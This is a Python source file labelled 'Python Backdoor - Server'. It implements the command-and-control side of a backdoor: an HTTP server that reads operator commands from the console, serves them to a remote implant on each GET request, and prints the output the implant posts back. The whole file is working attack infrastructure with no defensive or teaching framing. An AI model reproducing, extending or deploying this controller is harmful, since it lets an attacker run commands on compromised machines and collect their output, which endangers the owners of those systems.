#
# Python Backdoor - Server
#

import http.server, os, sys

HOST_NAME = str(sys.argv[1])
HOST_PORT = int(sys.argv[2])

class HTTPHandler(http.server.BaseHTTPRequestHandler):
    
    def do_GET(self):
        c2_command = input('[Usr@PyBD] ')
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(c2_command.encode())
    
    def do_POST(self):
        self.send_response(200)
        self.end_headers()
        length = int(self.headers['Content-Length'])
        PostData = self.rfile.read(length)
        print(PostData.decode())

if __name__ == '__main__':
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, HOST_PORT), HTTPHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('[-] Server Terminated')

